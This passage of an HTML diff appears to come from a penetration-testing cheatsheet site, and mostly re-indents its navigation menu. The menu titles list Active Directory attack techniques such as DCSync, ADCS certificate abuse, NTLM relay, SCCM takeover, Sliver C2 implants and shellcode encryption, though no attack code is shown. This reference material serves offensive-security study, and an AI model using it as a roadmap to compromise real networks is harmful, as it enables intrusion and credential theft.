-          <a href="#ad-enum-domain-constrained-delegation">8.3.4 Constrained Delegation</a>
-          <a href="#ad-enum-domain-rbcd">8.3.5 Resource-Based Constrained Delegation (RBCD)</a>
+        <a href="#ad-enum-domain-from-linux">8.3.1 From Linux</a>
+        <a href="#ad-enum-domain-from-windows">8.3.2 From Windows</a>
+        <a href="#ad-enum-domain-unconstrained-delegation">8.3.3 Unconstrained Delegation</a>
+        <a href="#ad-enum-domain-constrained-delegation">8.3.4 Constrained Delegation</a>
+        <a href="#ad-enum-domain-rbcd">8.3.5 Resource-Based Constrained Delegation (RBCD)</a>
         </div>
         <button class="dropdown-btn">8.4 PowerView
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-enum-powerview-domain-policy-dc">8.4.1 Domain / Policy / DC Info</a>
-          <a href="#ad-enum-powerview-users-groups">8.4.2 Users & Groups</a>
-          <a href="#ad-enum-powerview-computers-sessions">8.4.3 Computers & Sessions</a>
-          <a href="#ad-enum-powerview-shares-gpos">8.4.4 Shares & GPOs</a>
-          <a href="#ad-enum-powerview-acls-trusts">8.4.5 ACLs & Trusts</a>
+        <a href="#ad-enum-powerview-domain-policy-dc">8.4.1 Domain / Policy / DC Info</a>
+        <a href="#ad-enum-powerview-users-groups">8.4.2 Users & Groups</a>
+        <a href="#ad-enum-powerview-computers-sessions">8.4.3 Computers & Sessions</a>
+        <a href="#ad-enum-powerview-shares-gpos">8.4.4 Shares & GPOs</a>
+        <a href="#ad-enum-powerview-acls-trusts">8.4.5 ACLs & Trusts</a>
         </div>
         <button class="dropdown-btn">8.5 NetExec / CrackMapExec
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-enum-netexec-auth-spraying">8.5.1 Authentication & Spraying</a>
-          <a href="#ad-enum-netexec-enumeration">8.5.2 Enumeration</a>
-          <a href="#ad-enum-netexec-protocols-bloodhound">8.5.3 Protocol Modes, Roasting & BloodHound</a>
-          <a href="#ad-enum-netexec-modules-dumping">8.5.4 Modules & Credential Dumping</a>
+        <a href="#ad-enum-netexec-auth-spraying">8.5.1 Authentication & Spraying</a>
+        <a href="#ad-enum-netexec-enumeration">8.5.2 Enumeration</a>
+        <a href="#ad-enum-netexec-protocols-bloodhound">8.5.3 Protocol Modes, Roasting & BloodHound</a>
+        <a href="#ad-enum-netexec-modules-dumping">8.5.4 Modules & Credential Dumping</a>
         </div>
         <button class="dropdown-btn">8.6 BloodHound Collection & Cypher Queries
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-enum-cypher-collection">8.6.1 Collection Methods</a>
-          <a href="#ad-enum-cypher-prebuilt">8.6.2 Common Analysis (Pre-Built Queries)</a>
-          <a href="#ad-enum-cypher-custom">8.6.3 Custom Cypher Queries</a>
-          <a href="#ad-enum-cypher-marking">8.6.4 Marking Owned / High-Value & Pathfinding</a>
+        <a href="#ad-enum-cypher-collection">8.6.1 Collection Methods</a>
+        <a href="#ad-enum-cypher-prebuilt">8.6.2 Common Analysis (Pre-Built Queries)</a>
+        <a href="#ad-enum-cypher-custom">8.6.3 Custom Cypher Queries</a>
+        <a href="#ad-enum-cypher-marking">8.6.4 Marking Owned / High-Value & Pathfinding</a>
         </div>
       </div>
     </div>
     <div class="section-flow-9">
-      <button class="dropdown-btn">9. Active Directory Exploitation
+      <button class="dropdown-btn">9. AD Exploitation
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
@@ -12412,8 +12434,8 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-attack-unconstrained-delegation-spoolsample">9.1.1 Option 1: Force Authentication (SpoolSample)</a>
-          <a href="#ad-attack-unconstrained-delegation-ticket-in-memory">9.1.2 Option 2: Ticket Already in Memory</a>
+        <a href="#ad-attack-unconstrained-delegation-spoolsample">9.1.1 Option 1: Force Authentication (SpoolSample)</a>
+        <a href="#ad-attack-unconstrained-delegation-ticket-in-memory">9.1.2 Option 2: Ticket Already in Memory</a>
         </div>
         <a href="#ad-attack-dcsync">9.2 DCSync</a>
         <a href="#ad-attack-golden-tickets">9.3 Golden Tickets</a>
@@ -12425,103 +12447,103 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-attack-acl-enum">9.8.1 Enumerating ACLs</a>
-          <a href="#ad-attack-acl-genericall">9.8.2 GenericAll / GenericWrite</a>
-          <a href="#ad-attack-acl-writedacl">9.8.3 WriteDACL / WriteOwner</a>
-          <a href="#ad-attack-acl-forcechange">9.8.4 ForceChangePassword & AddMember</a>
+        <a href="#ad-attack-acl-enum">9.8.1 Enumerating ACLs</a>
+        <a href="#ad-attack-acl-genericall">9.8.2 GenericAll / GenericWrite</a>
+        <a href="#ad-attack-acl-writedacl">9.8.3 WriteDACL / WriteOwner</a>
+        <a href="#ad-attack-acl-forcechange">9.8.4 ForceChangePassword & AddMember</a>
         </div>
         <button class="dropdown-btn">9.9 JEA & JIT
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-attack-jea-enum">9.9.1 Enumerating JEA Endpoints</a>
-          <a href="#ad-attack-jea-escape">9.9.2 Escaping a Constrained JEA Session</a>
-          <a href="#ad-attack-jit-enum">9.9.3 Enumerating JIT (PAM)</a>
-          <a href="#ad-attack-jit-abuse">9.9.4 Abusing JIT Access</a>
+        <a href="#ad-attack-jea-enum">9.9.1 Enumerating JEA Endpoints</a>
+        <a href="#ad-attack-jea-escape">9.9.2 Escaping a Constrained JEA Session</a>
+        <a href="#ad-attack-jit-enum">9.9.3 Enumerating JIT (PAM)</a>
+        <a href="#ad-attack-jit-abuse">9.9.4 Abusing JIT Access</a>
         </div>
         <button class="dropdown-btn">9.10 Domain & Forest Trust Attacks
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-attack-trust-enum">9.10.1 Enumerating Trusts</a>
-          <a href="#ad-attack-trust-child-parent">9.10.2 Child-to-Parent (SID History)</a>
-          <a href="#ad-attack-trust-cross-forest">9.10.3 Cross-Forest Abuse</a>
+        <a href="#ad-attack-trust-enum">9.10.1 Enumerating Trusts</a>
+        <a href="#ad-attack-trust-child-parent">9.10.2 Child-to-Parent (SID History)</a>
+        <a href="#ad-attack-trust-cross-forest">9.10.3 Cross-Forest Abuse</a>
         </div>
         <button class="dropdown-btn">9.11 AD Certificate Services (ADCS)
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-attack-adcs-enum">9.11.1 Enumeration</a>
-          <a href="#ad-attack-adcs-auth">9.11.2 Authenticating with a Certificate</a>
-          <a href="#ad-attack-adcs-esc1">9.11.3 ESC1 — Enrollee-Supplied SAN</a>
-          <a href="#ad-attack-adcs-esc2">9.11.4 ESC2 — Any Purpose / SubCA EKU</a>
-          <a href="#ad-attack-adcs-esc3">9.11.5 ESC3 — Enrollment Agent Certificate</a>
-          <a href="#ad-attack-adcs-esc4">9.11.6 ESC4 — Vulnerable Template ACL</a>
-          <a href="#ad-attack-adcs-esc5">9.11.7 ESC5 — Vulnerable PKI Object ACL</a>
-          <a href="#ad-attack-adcs-esc6">9.11.8 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2</a>
-          <a href="#ad-attack-adcs-esc7">9.11.9 ESC7 — Vulnerable CA ACL</a>
-          <a href="#ad-attack-adcs-esc8">9.11.10 ESC8 — NTLM Relay to Web Enrollment</a>
-          <a href="#ad-attack-adcs-esc9">9.11.11 ESC9 — No Security Extension</a>
-          <a href="#ad-attack-adcs-esc10">9.11.12 ESC10 — Weak Certificate Mappings</a>
-          <a href="#ad-attack-adcs-esc11">9.11.13 ESC11 — Relay to ICPR (RPC Enrollment)</a>
+        <a href="#ad-attack-adcs-enum">9.11.1 Enumeration</a>
+        <a href="#ad-attack-adcs-auth">9.11.2 Authenticating with a Certificate</a>
+        <a href="#ad-attack-adcs-esc1">9.11.3 ESC1 — Enrollee-Supplied SAN</a>
+        <a href="#ad-attack-adcs-esc2">9.11.4 ESC2 — Any Purpose / SubCA EKU</a>
+        <a href="#ad-attack-adcs-esc3">9.11.5 ESC3 — Enrollment Agent Certificate</a>
+        <a href="#ad-attack-adcs-esc4">9.11.6 ESC4 — Vulnerable Template ACL</a>
+        <a href="#ad-attack-adcs-esc5">9.11.7 ESC5 — Vulnerable PKI Object ACL</a>
+        <a href="#ad-attack-adcs-esc6">9.11.8 ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2</a>
+        <a href="#ad-attack-adcs-esc7">9.11.9 ESC7 — Vulnerable CA ACL</a>
+        <a href="#ad-attack-adcs-esc8">9.11.10 ESC8 — NTLM Relay to Web Enrollment</a>
+        <a href="#ad-attack-adcs-esc9">9.11.11 ESC9 — No Security Extension</a>
+        <a href="#ad-attack-adcs-esc10">9.11.12 ESC10 — Weak Certificate Mappings</a>
+        <a href="#ad-attack-adcs-esc11">9.11.13 ESC11 — Relay to ICPR (RPC Enrollment)</a>
         </div>
         <button class="dropdown-btn">9.12 Kerberoasting & AS-REP Roasting
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-attack-kerberoast-spn">9.12.1 Kerberoasting</a>
-          <a href="#ad-attack-kerberoast-targeted">9.12.2 Targeted Kerberoasting</a>
-          <a href="#ad-attack-kerberoast-asrep">9.12.3 AS-REP Roasting</a>
+        <a href="#ad-attack-kerberoast-spn">9.12.1 Kerberoasting</a>
+        <a href="#ad-attack-kerberoast-targeted">9.12.2 Targeted Kerberoasting</a>
+        <a href="#ad-attack-kerberoast-asrep">9.12.3 AS-REP Roasting</a>
         </div>
         <button class="dropdown-btn">9.13 Pass-the-Ticket, Overpass-the-Hash & Silver Tickets
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-attack-ptt-pass-the-ticket">9.13.1 Pass-the-Ticket</a>
-          <a href="#ad-attack-ptt-overpass-the-hash">9.13.2 Overpass-the-Hash (Pass-the-Key)</a>
-          <a href="#ad-attack-ptt-silver-ticket">9.13.3 Silver Tickets</a>
+        <a href="#ad-attack-ptt-pass-the-ticket">9.13.1 Pass-the-Ticket</a>
+        <a href="#ad-attack-ptt-overpass-the-hash">9.13.2 Overpass-the-Hash (Pass-the-Key)</a>
+        <a href="#ad-attack-ptt-silver-ticket">9.13.3 Silver Tickets</a>
         </div>
         <button class="dropdown-btn">9.14 DACL Attacks (Extended)
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-attack-dacl-edges">9.14.1 Edge to Abuse Mapping</a>
-          <a href="#ad-attack-dacl-enum">9.14.2 Enumerating Rights (Linux)</a>
-          <a href="#ad-attack-dacl-owner">9.14.3 WriteOwner / WriteDACL Chain (Linux)</a>
-          <a href="#ad-attack-dacl-computer">9.14.4 Computer Object Takeover Chains</a>
-          <a href="#ad-attack-dacl-extrights">9.14.5 Extended Rights & Targeted Kerberoast</a>
-          <a href="#ad-attack-dacl-scriptpath">9.14.6 Logon Script (scriptPath) Abuse</a>
-          <a href="#ad-attack-dacl-gpo">9.14.7 GPO Abuse (WriteGPLink / Edit GPO)</a>
-          <a href="#ad-attack-dacl-spnjack">9.14.8 SPN-Jacking</a>
-          <a href="#ad-attack-dacl-samspoof">9.14.9 sAMAccountName Spoofing (NoPAC)</a>
-          <a href="#ad-attack-dacl-groups">9.14.10 Group Nesting & Self-Membership Chains</a>
+        <a href="#ad-attack-dacl-edges">9.14.1 Edge to Abuse Mapping</a>
+        <a href="#ad-attack-dacl-enum">9.14.2 Enumerating Rights (Linux)</a>
+        <a href="#ad-attack-dacl-owner">9.14.3 WriteOwner / WriteDACL Chain (Linux)</a>
+        <a href="#ad-attack-dacl-computer">9.14.4 Computer Object Takeover Chains</a>
+        <a href="#ad-attack-dacl-extrights">9.14.5 Extended Rights & Targeted Kerberoast</a>
+        <a href="#ad-attack-dacl-scriptpath">9.14.6 Logon Script (scriptPath) Abuse</a>
+        <a href="#ad-attack-dacl-gpo">9.14.7 GPO Abuse (WriteGPLink / Edit GPO)</a>
+        <a href="#ad-attack-dacl-spnjack">9.14.8 SPN-Jacking</a>
+        <a href="#ad-attack-dacl-samspoof">9.14.9 sAMAccountName Spoofing (NoPAC)</a>
+        <a href="#ad-attack-dacl-groups">9.14.10 Group Nesting & Self-Membership Chains</a>
         </div>
         <button class="dropdown-btn">9.15 NTLM Relay Attacks
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-attack-relay-theory">9.15.1 Theory</a>
-          <a href="#ad-attack-relay-coercion">9.15.2 Authentication Coercion</a>
-          <a href="#ad-attack-relay-smb">9.15.3 SMB Relay</a>
-          <a href="#ad-attack-relay-ldap">9.15.4 LDAP/LDAPS Relay</a>
-          <a href="#ad-attack-relay-adcs-esc8">9.15.5 Relay to ADCS Web Enrollment (ESC8)</a>
-          <a href="#ad-attack-relay-mitm6">9.15.6 mitm6 — IPv6 DNS Takeover</a>
+        <a href="#ad-attack-relay-theory">9.15.1 Theory</a>
+        <a href="#ad-attack-relay-coercion">9.15.2 Authentication Coercion</a>
+        <a href="#ad-attack-relay-smb">9.15.3 SMB Relay</a>
+        <a href="#ad-attack-relay-ldap">9.15.4 LDAP/LDAPS Relay</a>
+        <a href="#ad-attack-relay-adcs-esc8">9.15.5 Relay to ADCS Web Enrollment (ESC8)</a>
+        <a href="#ad-attack-relay-mitm6">9.15.6 mitm6 — IPv6 DNS Takeover</a>
         </div>
         <button class="dropdown-btn">9.16 SCCM & Exchange Attacks
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#ad-attack-sccm-enumeration">9.16.1 SCCM Enumeration</a>
-          <a href="#ad-attack-sccm-credential-harvesting">9.16.2 SCCM Credential Harvesting (NAA)</a>
-          <a href="#ad-attack-sccm-pxe">9.16.3 SCCM PXE Credential Recovery</a>
-          <a href="#ad-attack-sccm-client-push">9.16.4 SCCM Client Push Relay</a>
-          <a href="#ad-attack-sccm-takeover-mssql">9.16.5 SCCM Takeover — Relay to Site Database</a>
-          <a href="#ad-attack-sccm-takeover-adminservice">9.16.6 SCCM Takeover — Relay to AdminService</a>
-          <a href="#ad-attack-sccm-post-exploitation">9.16.7 SCCM Post-Exploitation (CMPivot / Deployment)</a>
-          <a href="#ad-attack-sccm-summary">9.16.8 SCCM Attack Summary</a>
-          <a href="#ad-attack-exchange-privexchange">9.16.9 Exchange — PrivExchange</a>
-          <a href="#ad-attack-exchange-proxyshell">9.16.10 Exchange — ProxyShell / ProxyLogon</a>
-          <a href="#ad-attack-exchange-mailbox-abuse">9.16.11 Exchange — Mailbox & GAL Abuse</a>
+        <a href="#ad-attack-sccm-enumeration">9.16.1 SCCM Enumeration</a>
+        <a href="#ad-attack-sccm-credential-harvesting">9.16.2 SCCM Credential Harvesting (NAA)</a>
+        <a href="#ad-attack-sccm-pxe">9.16.3 SCCM PXE Credential Recovery</a>
+        <a href="#ad-attack-sccm-client-push">9.16.4 SCCM Client Push Relay</a>
+        <a href="#ad-attack-sccm-takeover-mssql">9.16.5 SCCM Takeover — Relay to Site Database</a>
+        <a href="#ad-attack-sccm-takeover-adminservice">9.16.6 SCCM Takeover — Relay to AdminService</a>
+        <a href="#ad-attack-sccm-post-exploitation">9.16.7 SCCM Post-Exploitation (CMPivot / Deployment)</a>
+        <a href="#ad-attack-sccm-summary">9.16.8 SCCM Attack Summary</a>
+        <a href="#ad-attack-exchange-privexchange">9.16.9 Exchange — PrivExchange</a>
+        <a href="#ad-attack-exchange-proxyshell">9.16.10 Exchange — ProxyShell / ProxyLogon</a>
+        <a href="#ad-attack-exchange-mailbox-abuse">9.16.11 Exchange — Mailbox & GAL Abuse</a>
         </div>
       </div>
     </div>
@@ -12538,45 +12560,52 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#utils-encryptors-shellcode-encryptor-bins">10.5.1 Shellcode Encryptor for .BINs</a>
-          <a href="#utils-encryptors-shellcode-encryptor-meterpreter">10.5.2 Shellcode Encryptor for Meterpreter</a>
+        <a href="#utils-encryptors-shellcode-encryptor-bins">10.5.1 Shellcode Encryptor for .BINs</a>
+        <a href="#utils-encryptors-shellcode-encryptor-meterpreter">10.5.2 Shellcode Encryptor for Meterpreter</a>
         </div>
         <button class="dropdown-btn">10.6 RDP Connecting
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#utils-rdp-connecting-commands">10.6.1 Connecting Commands</a>
-          <a href="#utils-rdp-connecting-enable-rdp">10.6.2 Enable RDP If Disabled</a>
+        <a href="#utils-rdp-connecting-commands">10.6.1 Connecting Commands</a>
+        <a href="#utils-rdp-connecting-enable-rdp">10.6.2 Enable RDP If Disabled</a>
         </div>
         <button class="dropdown-btn">10.7 Sliver C2
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#utils-sliver-setup">10.7.1 Setup</a>
-          <a href="#utils-sliver-listeners">10.7.2 Listeners</a>
-          <a href="#utils-sliver-implants">10.7.3 Implant Generation</a>
-          <a href="#utils-sliver-staging">10.7.4 Staging — Nim Stager</a>
-          <a href="#utils-sliver-session">10.7.5 Session Operations</a>
-          <a href="#utils-sliver-assembly">10.7.6 Execute-Assembly & Armory</a>
-          <a href="#utils-sliver-pivoting">10.7.7 Pivoting</a>
+        <a href="#utils-sliver-setup">10.7.1 Setup</a>
+        <a href="#utils-sliver-listeners">10.7.2 Listeners</a>
+        <a href="#utils-sliver-implants">10.7.3 Implant Generation</a>
+        <a href="#utils-sliver-staging">10.7.4 Staging — Nim Stager</a>
+        <a href="#utils-sliver-session">10.7.5 Session Operations</a>
+        <a href="#utils-sliver-assembly">10.7.6 Execute-Assembly & Armory</a>
+        <a href="#utils-sliver-pivoting">10.7.7 Pivoting</a>
         </div>
         <button class="dropdown-btn">10.8 Impacket Suite
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#utils-impacket-exec">10.8.1 Remote Execution</a>
-          <a href="#utils-impacket-dump">10.8.2 Credential Dumping</a>
-          <a href="#utils-impacket-kerberos">10.8.3 Kerberos</a>
-          <a href="#utils-impacket-relay">10.8.4 NTLM Relay</a>
+        <a href="#utils-impacket-exec">10.8.1 Remote Execution</a>
+        <a href="#utils-impacket-dump">10.8.2 Credential Dumping</a>
+        <a href="#utils-impacket-kerberos">10.8.3 Kerberos</a>
+        <a href="#utils-impacket-relay">10.8.4 NTLM Relay</a>
         </div>
         <button class="dropdown-btn">10.9 BloodyAD
           <i class="bi bi-caret-down-fill"></i>
         </button>
         <div class="nested-dropdown-container">
-          <a href="#utils-bloodyad-enum">10.9.1 Enumeration</a>
-          <a href="#utils-bloodyad-abuse">10.9.2 ACL & Object Abuse</a>
-          <a href="#utils-bloodyad-creds">10.9.3 Credential & Certificate Attacks</a>
+        <a href="#utils-bloodyad-enum">10.9.1 Enumeration</a>
+        <a href="#utils-bloodyad-abuse">10.9.2 ACL & Object Abuse</a>
+        <a href="#utils-bloodyad-creds">10.9.3 Credential & Certificate Attacks</a>
         </div>
+      </div>
+    </div>
+    <div class="section-flow-11">
+      <button class="dropdown-btn">11. References
+        <i class="bi bi-caret-down-fill"></i>
+      </button>
+      <div class="dropdown-container">
       </div>
     </div>
   </div>
@@ -12628,6 +12657,7 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
 
   <script defer src="js/site.js"></script>
   <script defer src="js/cheatsheet-index.js"></script>
+  <script defer src="js/methodology-checkboxes.js"></script>
 
   </body>
 
